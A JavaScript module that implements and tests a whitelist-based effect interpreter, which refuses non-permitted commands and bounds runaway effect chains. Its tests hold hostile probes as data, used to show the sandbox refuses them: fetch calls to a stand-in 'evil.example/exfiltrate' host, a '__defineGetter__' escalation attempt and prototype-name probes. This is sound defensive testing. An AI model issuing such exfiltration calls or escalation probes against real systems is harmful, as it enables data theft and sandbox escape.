/**
 * `interpret` — the restricted effect interpreter (EXEC-01). It translates a
 * guest `Effect` into its value by dispatching through `map`, refusing (as a
 * `Result`, never a throw — locked decision, see 03-CONTEXT.md) anything
 * `map` does not itself own.
 *
 * ## The refusal is an INTERRUPTION, not a `NotImplemented` (fjs 0.46.0)
 *
 * 0.46.0 gives every operation an error channel, and gives a runner two
 * eliminators. Choosing between them is the whole design of this module, and
 * upstream states the rule this module needs verbatim
 * (`fjs/effects/types.ts`, `NotImplemented`): a runner "may interrupt or
 * terminate a program that is malicious, over budget, or violating host
 * policy, and nothing in the error channel obliges it to hand control back. A
 * capability the runner merely lacks is answered with this error; **a refusal
 * to continue is an interruption, never dressed up as `NotImplemented`**."
 *
 * `interpret` is the second kind. It is not a runner that happens to lack
 * `fetch` — it is a whitelist, and a guest that asks for something outside it
 * does not get its control back to try again. So this module does NOT use
 * `partialMatch`: that hands `error(notImplemented(command))` to the guest's
 * own continuation, which would let a malicious program swallow its own
 * refusal and return a plausible value with the denial nowhere in the run
 * record. The refusal is `interpret`'s own `error`, and it ends the run.
 *
 * ## EXEC-02 is still upstream's guard, called rather than caught
 *
 * The own-property-only lookup is `at` from
 * `functionalscript/fjs/types/object/module.f.mjs` — the very function
 * `match` uses internally, so `constructor`, `toString` and
 * `__defineGetter__` resolve to `null` here for the same reason they do
 * there. This module calls it BEFORE dispatching instead of catching the
 * throw that `match` raises after doing the same lookup itself. That is what
 * retired `fjs/todo/upstream-total-match-dispatch.md`: the outcome `match`'s
 * signature says is unobservable is simply not reached, rather than observed
 * through an exception. (That note called this "the only `try` left in any
 * `.f.js` file", which was already untrue when it was written — `fjs/tax/table`,
 * `fjs/tax/deduction`, `fjs/schedule/a` and `fjs/server/fjs_run/snapshot` each
 * catch an `assert` throw of this project's own. Those are a different gap and
 * they are still open; this one was the only `try` forced by a DEPENDENCY
 * refusing in the wrong shape, which is what made it unfixable locally.)
 *
 * The module imports only `functionalscript/fjs/effects/module.f.mjs`,
 * `functionalscript/fjs/types/result/module.f.mjs`,
 * `functionalscript/fjs/types/object/module.f.mjs`, and
 * `functionalscript/fjs/asserts/module.f.mjs` (no CAS, no Evo, no MCP, no
 * filesystem).
 *
 * @module
 */
import { match, do_, pureOk, step } from 'functionalscript/fjs/effects/module.f.mjs'
import { ok, error, mapOk } from 'functionalscript/fjs/types/result/module.f.mjs'
import { at } from 'functionalscript/fjs/types/object/module.f.mjs'
import { assert, assertEq } from 'functionalscript/fjs/asserts/module.f.mjs'

/** @import { Effect, Operation, OperationMap, Return } from 'functionalscript/fjs/effects/types.js' */
/** @import { Result } from 'functionalscript/fjs/types/result/types.js' */

// ── Test fixtures ───────────────────────────────────────────────────────────────

/**
 * The fixture operations, each declared with the error channel it actually
 * has: `never`. 0.46.0's `Operation` requires the handler to return a
 * `Result` — there must be somewhere for a runner's refusal to go — but it
 * does not require the operation itself to be able to fail, and these four
 * are total string builders. Saying `never` rather than a placeholder is what
 * makes `interpret`'s error channel collapse to `string` for this map, which
 * is the claim these proofs then read.
 */
/** @typedef {readonly ['casRead', (a: string) => Result<string, never>]} CasRead */
/** @typedef {readonly ['evoList', (a: string) => Result<string, never>]} EvoList */
/** @typedef {readonly ['evoHead', (a: string) => Result<string, never>]} EvoHead */
/** @typedef {readonly ['evoRevision', (a: string) => Result<string, never>]} EvoRevision */
/** @typedef {CasRead | EvoList | EvoHead | EvoRevision} TestOp */

/**
 * The proof's whitelist: exactly `casRead`, `evoList`, `evoHead`,
 * `evoRevision`, in this declaration order — `Object.keys` reports insertion
 * order, and that order is what a refusal message's permitted list reads as.
 * The null prototype below is cheap defence in depth (03-CONTEXT.md); it is
 * not the security mechanism — `match`'s own-property-only `at` lookup is
 * (EXEC-02, delivered upstream, not reimplemented here).
 * A plain object literal, deliberately not null-prototyped. The
 * `constructor`/`toString`/`hasOwnProperty` probes below are the reason: with
 * a null prototype they would pass because the inherited names were absent,
 * which proves nothing about `interpret`. Leaving `Object.prototype` in place
 * means they pass only if the own-property-only `at` lookup is what refuses
 * them — the guarantee actually being claimed.
 * @type {OperationMap<TestOp, Result<string, never>>}
 */
const map = {
    casRead: a => ok(`casRead:${a}`),
    evoList: a => ok(`evoList:${a}`),
    evoHead: a => ok(`evoHead:${a}`),
    evoRevision: a => ok(`evoRevision:${a}`),
}

/**
 * The PROBE vocabulary: the same handler signature, with the command name
 * left as `string` instead of the four literals.
 *
 * This is what makes the refusal proofs below expressible **without an
 * `any`**, and the fact that it is expressible is a property of 0.46.0.
 * `Operation` is `readonly [string, (…) => Result<…>]`, so a name that is not
 * statically known is an ordinary operation type, not a hole — and
 * `interpret` is generic in the operation set, so it can be handed a map and
 * an effect that both live at this wider vocabulary. The map still holds
 * exactly four handlers; a fifth command is refused by `at` finding nothing,
 * which is precisely the backstop being proven.
 *
 * The payload is `readonly unknown[]` because a probe's payload is
 * attacker-shaped: `__defineGetter__` is dispatched with a name and a
 * function, `constructor` with nothing at all. That is also why this is a
 * separate vocabulary from {@link TestOp} rather than a widening of it — a
 * real operation's payload is typed, and saying so is the whole point of the
 * four typedefs above.
 * @typedef {readonly [string, (...payload: readonly unknown[]) => Result<string, never>]} ProbeOp
 */

/**
 * `map`, at the probe vocabulary: the SAME four commands, in the SAME
 * declaration order, so `refusalMessage`'s permitted list reads identically.
 * It is a second object rather than a second annotation on the first because
 * the handler signatures genuinely differ — see {@link ProbeOp}.
 *
 * `twoStepDefineGetterEscalation` asserts against THIS object, since this is
 * the one a probe could have installed a getter on.
 * @type {OperationMap<ProbeOp, Result<string, never>>}
 */
const probeMap = {
    casRead: (...payload) => ok(`casRead:${String(payload[0])}`),
    evoList: (...payload) => ok(`evoList:${String(payload[0])}`),
    evoHead: (...payload) => ok(`evoHead:${String(payload[0])}`),
    evoRevision: (...payload) => ok(`evoRevision:${String(payload[0])}`),
}

/**
 * Simulates a stored/generated program whose command string bypassed `tsc` —
 * a real `CasOp`-typed program cannot construct these (see EXEC-07, Phase
 * 6) — but `interpret`'s runtime refusal is the backstop for exactly this
 * case. Every non-permitted-name probe below goes through `probeDo`.
 *
 * **This used to be `/** @type {any} *\/ (do_)`.** It is an ordinary
 * annotated binding now: `do_` is generic in `O`, and {@link ProbeOp} is a
 * legal `O`, so nothing has to be discarded to say "a command whose name is
 * not known until runtime". The `any` was never load-bearing — it was the
 * absence of a vocabulary type that admitted an unknown name.
 * @type {(command: string) => (...payload: readonly unknown[]) => Effect<ProbeOp, string, never>}
 */
const probeDo = do_

/**
 * `do_` narrowed to the one permitted-name probe (`dispatch`, below).
 * `do_('casRead')` alone under-constrains `O` to bare `Operation`, not
 * `CasRead` — this annotation is what pins it.
 * @type {(a: string) => Effect<CasRead, string, never>}
 */
const readDo = do_('casRead')

/**
 * `do_` narrowed to `evoHead`, for the two-step read-set proof below — same
 * under-constraining reason as `readDo`.
 * @type {(a: string) => Effect<EvoHead, string, never>}
 */
const evoHeadDo = do_('evoHead')

/**
 * Builds a chain of exactly `remaining` `casRead` dispatches followed by a
 * `Pure` completion — the fixed-length sibling of `forever` below, used to
 * pin `interpret`'s step-budget boundary at an EXACT dispatch count rather
 * than merely demonstrate it eventually refuses an unbounded chain. Like
 * `forever`, each call returns immediately (`step`'s `Do` case defers), so
 * building this costs no stack depth regardless of `remaining` — only
 * interpreting it drives the chain, one dispatch per `interpret` loop
 * iteration.
 * @type {(remaining: number) => Effect<CasRead, string, never>}
 */
const chainOfLength = remaining =>
    remaining <= 0
        ? pureOk('done')
        : step(readDo('spin'), () => chainOfLength(remaining - 1))

// ── interpret ────────────────────────────────────────────────────────────────

/**
 * Reports a refusal: the refused command's name plus `map`'s own permitted
 * set, in `Object.keys` insertion order (never sorted or filtered) — this is
 * the reported text an agent reads, not `match`'s raw bare-string throw.
 * @type {(command: string, map: object) => string}
 */
const refusalMessage = (command, map) => `operation not permitted: ${command}; permitted: ${Object.keys(map).join(', ')}`

/**
 * One command `interpret` actually dispatched: its name and the payload it
 * was called with. Observed by `interpret` as it dispatches, never declared
 * or supplied by the guest effect (EXEC-05) — see `reads` below.
 * @typedef {readonly [string, readonly unknown[]]} Read
 */

/**
 * An interpreted effect's outcome: the effect's value paired with every
 * command actually dispatched to reach it, in dispatch order — or a failure.
 *
 * **The error channel is `E | string`, and the union is deliberate.** Two
 * different things can go wrong and only one of them is this module's:
 *
 * - `string` — an INTERRUPTION by `interpret` itself: EXEC-03's actionable
 *   refusal text, or the step-budget refusal (EXEC-06). The guest does not
 *   get control back, which is the point.
 * - `E` — the guest program's OWN failure, arriving through the `Result` its
 *   final `Pure` holds. 0.46.0 gives every effect an error channel, so a
 *   program can now fail on its own terms; that is a program outcome, not a
 *   policy verdict, and `interpret` passes it through rather than renaming it.
 *
 * They are unioned rather than nested because every consumer here turns
 * either one into the same thing — a run record's `kind: 'error'` message —
 * and a nested `Result` would make all of them destructure a second level to
 * reach a value they treat identically. Where a map's operations cannot fail,
 * `E` is `never` and this collapses to exactly the `Result<[T, Read[]],
 * string>` it was before 0.46.0, which is why the `TestOp` fixtures declare
 * `never` rather than a placeholder.
 *
 * The cost, recorded rather than discovered later: a consumer holding only
 * this type cannot tell a policy refusal from a program failure when `E` is
 * itself `string`. The refusal texts are distinctive (`operation not
 * permitted: …`, `step budget exceeded: …`) and the integration proofs match
 * on them, so nothing depends on the distinction today. A consumer that needs
 * it should be given a tagged channel rather than parsing the message.
 * @template T
 * @template E
 * @typedef {Result<readonly [T, readonly Read[]], E | string>} Interpreted
 */

/**
 * Bounds `interpret`'s dispatch loop (EXEC-06). `asyncRun` elsewhere in fjs
 * is an unbounded `while (true)` — a generated effect chain with a wrong
 * termination condition would otherwise hang the single-process server
 * silently, with no response and no way to cancel. 10,000 is a runaway
 * guard, not a tuned limit — a named, exported constant so it can be
 * changed without hunting a literal (03-CONTEXT.md).
 * @type {number}
 */
export const stepBudget = 10_000

/**
 * Dispatches a guest `Effect` through `map`, one command at a time, bounded
 * by `stepBudget` and accumulating the read set it actually observes.
 *
 * A `Pure` effect is already-computed per its contract — `e()` forces it
 * directly, no dispatch involved. What it holds since 0.46.0 is the guest's
 * whole `Result<T, E>`, so the loop ends by `mapOk`ping the reads alongside
 * the value: an `ok` becomes `ok([value, reads])`, and the guest's own
 * `error` passes through untouched into this function's `E | string`
 * channel. `mapOk` rather than a tag test because there is nothing to decide
 * here — a program that failed has failed, and re-tagging its error would
 * only lose which one it was.
 *
 * A `Do` node is checked against `map` and then dispatched. The check is
 * `at(command)(map)`, upstream's own-property-only lookup and the same one
 * `match` performs internally, so the two agree by construction rather than
 * by comment: a command `at` resolves to `null` is refused here as a value,
 * and every command that survives is one `match` is guaranteed to find. That
 * guarantee is what lets `match` be called without a `try` — the throw it
 * documents for a missing handler is unreachable from this call site, and the
 * `assert` on `'cont'` states the remaining half (a `Do` node never decodes
 * to `'done'`).
 *
 * The dispatched command and its payload are appended to `reads` **after**
 * the dispatch, never before — a refused attempt was never read, per
 * EXEC-05 — and the loop continues with the continuation applied to the
 * operation's output. Note that the output is now the operation's `Result`:
 * `match` hands a failed command's `error` back **through the ordinary
 * continuation** by design, so a fallible operation's failure is the guest's
 * to handle, and it reaches this function only if the guest lets it reach its
 * final `Pure`.
 *
 * If the loop exhausts `stepBudget` without reaching a `Pure` node, the
 * chain is treated as non-terminating and refused the same way a denied
 * command is — a value, never a thrown error or an unbounded hang
 * (EXEC-06).
 * @template {Operation} O
 * @param {OperationMap<O, Return<O>>} map
 * @returns {<T, E>(effect: Effect<O, T, E>) => Interpreted<T, E>}
 */
export const interpret = map => effect => {
    let e = effect
    /** @type {readonly Read[]} */
    let reads = []
    for (let count = 0; count < stepBudget; count++) {
        if (typeof e === 'function') {
            return mapOk(value => /** @type {const} */ ([value, reads]))(e())
        }
        const { command, payload } = e
        if (at(command)(map) === null) {
            return error(refusalMessage(command, map))
        }
        const result = match(map)(e)
        assert(result[0] === 'cont')
        reads = [...reads, [command, payload]]
        e = result[2](result[1])
    }
    return error(`step budget exceeded: ${stepBudget}`)
}

// ── Tests ────────────────────────────────────────────────────────────────────

export const proof = {
    dispatch: () => {
        const result = interpret(map)(readDo('doc-a'))
        assertEq(result[0], 'ok')
        const [value, reads] = result[1]
        assertEq(value, 'casRead:doc-a')
        assertEq(JSON.stringify(reads), JSON.stringify([['casRead', ['doc-a']]]))
    },
    // EXEC-06: a self-referential chain that never reaches a `Pure` node
    // must not hang `interpret` — it returns a bounded step-budget refusal
    // within `stepBudget` iterations. `step`'s `Do` case defers, so
    // constructing `forever()` terminates immediately; only interpreting it
    // drives the (otherwise infinite) chain, and the budget bounds that.
    stepBudgetBoundsNonTerminatingChain: () => {
        /** @type {() => Effect<CasRead, never>} */
        const forever = () => step(readDo('spin'), forever)
        const result = interpret(map)(forever())
        assertEq(result[0], 'error')
        assertEq(result[1], 'step budget exceeded: 10000')
    },
    // T-09-08-04: `stepBudgetBoundsNonTerminatingChain` above only reads the
    // refusal MESSAGE, which is derived from the same `stepBudget` constant
    // either way — a `count < stepBudget` -> `count <= stepBudget` mutation
    // does not move that string at all, so that leaf alone cannot catch it.
    // This leaf counts ACTUAL dispatches instead, pinning the true boundary
    // of `interpret`'s loop (confirmed empirically against this module, not
    // assumed): a chain dispatching exactly `stepBudget` operations before
    // reaching `Pure` is refused — completing it needs one more loop
    // iteration than the budget allows, to notice the chain went `Pure` —
    // while a chain one dispatch SHORTER completes, because that one extra
    // iteration is exactly what remains. `count <= stepBudget` admits the
    // extra iteration and lets the longer chain wrongly complete.
    stepBudgetPinsExactDispatchBoundary: () => {
        const oneShortOfBudget = interpret(map)(chainOfLength(stepBudget - 1))
        assertEq(
            oneShortOfBudget[0],
            'ok',
            ['expected one dispatch short of the budget to complete', oneShortOfBudget])
        const exactlyAtBudget = interpret(map)(chainOfLength(stepBudget))
        assertEq(
            exactlyAtBudget[0],
            'error',
            ['expected exactly stepBudget dispatches to be refused, not admitted', exactlyAtBudget])
    },
    // EXEC-05: the read set is observed as interpret dispatches, never
    // declared by the effect chain itself.
    readSetReflectsActualDispatch: () => {
        const chain = step(readDo('doc-a'), () => evoHeadDo('subject-b'))
        const result = interpret(map)(chain)
        assertEq(result[0], 'ok')
        const [, reads] = result[1]
        assertEq(
            JSON.stringify(reads),
            JSON.stringify([['casRead', ['doc-a']], ['evoHead', ['subject-b']]]))
    },
    // A refusal partway through a chain must still refuse, and must report the
    // refused command — not the successful one before it. Every other refusal
    // proof denies on the *first* command, so without this leaf nothing covers
    // a denial reached after real work.
    //
    // Note what this deliberately does NOT claim. Whether `reads` is extended
    // before or after `match` dispatches is unobservable from outside: the
    // refusal path returns `error(message)` and discards the read set. Both
    // orderings pass every proof here. The append sits after the dispatch
    // because a refused operation was never read, but that is an invariant of
    // the implementation, not something the current API can witness. If a later
    // phase returns partial reads alongside a refusal, this becomes testable and
    // should be pinned then.
    refusalPartwayThroughAChainReportsTheRefusedCommand: () => {
        const denied = step(probeDo('casRead')('doc-a'), () => probeDo('fetch')('https://evil'))
        const result = interpret(probeMap)(denied)
        assertEq(result[0], 'error')
        assertEq(
            result[1],
            'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
    },
    refusals: {
        constructor: () => {
            const result = interpret(probeMap)(probeDo('constructor')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: constructor; permitted: casRead, evoList, evoHead, evoRevision')
        },
        toString: () => {
            const result = interpret(probeMap)(probeDo('toString')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: toString; permitted: casRead, evoList, evoHead, evoRevision')
        },
        valueOf: () => {
            const result = interpret(probeMap)(probeDo('valueOf')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: valueOf; permitted: casRead, evoList, evoHead, evoRevision')
        },
        hasOwnProperty: () => {
            const result = interpret(probeMap)(probeDo('hasOwnProperty')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: hasOwnProperty; permitted: casRead, evoList, evoHead, evoRevision')
        },
        defineGetter: () => {
            const result = interpret(probeMap)(probeDo('__defineGetter__')())
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        },
        fetch: () => {
            const result = interpret(probeMap)(probeDo('fetch')('https://evil.example/exfiltrate'))
            assertEq(result[0], 'error')
            assertEq(
                result[1],
                'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
        },
    },
    // The permitted half of the same question. Every refusal leaf here
    // names the four permitted commands, and only `casRead` had ever been
    // dispatched — so nothing pinned that the other three reach their OWN
    // handler rather than some shared one. A map whose four entries all
    // resolved to the same function would satisfy "not refused" while
    // quietly conflating the commands, which is why each row asserts the
    // handler's own tagged answer and not merely an `ok`.
    everyPermittedNameDispatchesToItsOwnHandler: () => {
        const permitted = ['casRead', 'evoList', 'evoHead', 'evoRevision']
        assertEq(permitted.length, 4, 'the four names refusalMessage prints as permitted')
        for (const name of permitted) {
            const result = interpret(probeMap)(probeDo(name)('argument'))
            assertEq(result[0], 'ok', name)
            const [value, reads] = result[1]
            assertEq(value, `${name}:argument`, ['each name answers with its own handler', name])
            assertEq(JSON.stringify(reads), JSON.stringify([[name, ['argument']]]),
                ['and is recorded under its own name', name])
        }
    },
    // EXEC-04: the two-step escalation chased to its logical end, not just a
    // single refused dispatch. Installing a getter for a denied command is
    // itself refused before the getter function ever runs, so the map gains
    // no own property from the attempt, and a following dispatch of the
    // target command is still refused with its own message.
    //
    // The getter body below is deliberately the one function in this module
    // no run reaches: that it is never entered IS the security property.
    twoStepDefineGetterEscalation: () => {
        const install = interpret(probeMap)(probeDo('__defineGetter__')('fetch', () => 'exfiltrated'))
        assertEq(install[0], 'error')
        assertEq(
            install[1],
            'operation not permitted: __defineGetter__; permitted: casRead, evoList, evoHead, evoRevision')
        assert(!Object.hasOwn(probeMap, 'fetch'))
        const followUp = interpret(probeMap)(probeDo('fetch')('https://evil.example/exfiltrate'))
        assertEq(followUp[0], 'error')
        assertEq(
            followUp[1],
            'operation not permitted: fetch; permitted: casRead, evoList, evoHead, evoRevision')
    },
}
